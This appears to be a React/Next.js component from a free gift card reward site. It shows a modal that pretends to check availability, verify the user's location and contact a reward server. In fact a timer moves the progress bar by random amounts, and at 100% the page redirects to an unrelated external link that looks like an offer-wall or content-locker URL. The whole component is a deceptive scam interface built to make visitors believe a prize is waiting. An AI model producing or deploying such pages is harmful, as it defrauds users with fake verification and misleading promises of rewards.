
"use client";

import { useEffect, useState } from 'react';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import { Progress } from '@/components/ui/progress';
import { Zap, CheckCircle2, Loader2, Sparkles } from 'lucide-react';
import { GiftCard } from '@/lib/gift-cards';
import { PlaceHolderImages } from '@/lib/placeholder-images';
import Image from 'next/image';

const steps = [
  "Checking reward availability...",
  "Verifying user location...",
  "Connecting to reward server...",
  "Validating reward eligibility...",
  "Preparing gift card...",
  "Reward ready!"
];

export function RewardUnlockModal({ 
  card, 
  value, 
  isOpen, 
  onClose 
}: { 
  card: GiftCard; 
  value: string;
  isOpen: boolean; 
  onClose: () => void 
}) {
  const [currentStep, setCurrentStep] = useState(0);
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    if (isOpen) {
      setCurrentStep(0);
      setProgress(0);
      
      const interval = setInterval(() => {
        setProgress(prev => {
          if (prev >= 100) {
            clearInterval(interval);
            setTimeout(() => {
              window.location.href = "https://gameflashx.space/cl/i/277ood";
            }, 1500);
            return 100;
          }
          const next = prev + (Math.random() * 10);
          
          // Update step based on progress
          const stepIndex = Math.floor((next / 100) * (steps.length - 1));
          if (stepIndex > currentStep) setCurrentStep(stepIndex);
          
          return Math.min(next, 100);
        });
      }, 300);

      return () => clearInterval(interval);
    }
  }, [isOpen, currentStep]);

  const imageData = PlaceHolderImages.find(img => img.id === card.image) || PlaceHolderImages[0];

  return (
    <Dialog open={isOpen} onOpenChange={(open) => !open && onClose()}>
      <DialogContent className="max-w-2xl bg-black/90 backdrop-blur-3xl border-white/10 p-0 overflow-hidden">
        <div className="relative p-8 md:p-12 flex flex-col items-center text-center">
          <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full h-1 bg-primary/20">
            <div 
              className="h-full bg-primary transition-all duration-300" 
              style={{ width: `${progress}%` }} 
            />
          </div>

          <div className="relative w-48 h-32 md:w-64 md:h-40 rounded-xl overflow-hidden mb-8 shadow-2xl animate-float">
            <Image 
              src={imageData.imageUrl}
              alt={card.brand}
              fill
              className="object-cover"
            />
            <div className="absolute inset-0 bg-black/20 flex items-center justify-center">
              <span className="text-3xl font-bold text-white drop-shadow-lg">{value}</span>
            </div>
          </div>

          <h2 className="font-headline text-3xl font-bold mb-2 text-white">Unlocking {card.brand} Reward</h2>
          <p className="text-muted-foreground mb-12">Please wait while our servers process your secure request...</p>

          <div className="w-full max-w-md space-y-6">
            <div className="flex flex-col gap-4">
              {steps.map((step, idx) => (
                <div key={idx} className={`flex items-center gap-3 transition-all duration-500 ${idx <= currentStep ? 'opacity-100 translate-x-0' : 'opacity-20 translate-x-4'}`}>
                  {idx < currentStep ? (
                    <CheckCircle2 className="w-5 h-5 text-green-500" />
                  ) : idx === currentStep && progress < 100 ? (
                    <Loader2 className="w-5 h-5 text-primary animate-spin" />
                  ) : idx === currentStep && progress === 100 ? (
                    <CheckCircle2 className="w-5 h-5 text-green-500" />
                  ) : (
                    <Zap className="w-5 h-5 text-white/20" />
                  )}
                  <span className={`text-sm md:text-base font-medium ${idx === currentStep ? 'text-primary' : 'text-white/60'}`}>
                    {step}
                  </span>
                </div>
              ))}
            </div>

            <div className="pt-4">
              <Progress value={progress} className="h-2 bg-white/5" />
              <div className="flex justify-between mt-2 text-xs font-mono text-muted-foreground uppercase tracking-widest">
                <span>Status: {progress === 100 ? 'Complete' : 'Processing'}</span>
                <span>{Math.round(progress)}%</span>
              </div>
            </div>
          </div>

          {progress === 100 && (
            <div className="absolute inset-0 bg-primary flex flex-col items-center justify-center animate-in fade-in duration-500 z-50">
              <Sparkles className="w-20 h-20 text-white mb-4 animate-bounce" />
              <h3 className="text-4xl font-headline font-bold text-white mb-2">REWARD READY!</h3>
              <p className="text-white/80">Redirecting you to the claim page...</p>
            </div>
          )}
        </div>
      </DialogContent>
    </Dialog>
  );
}
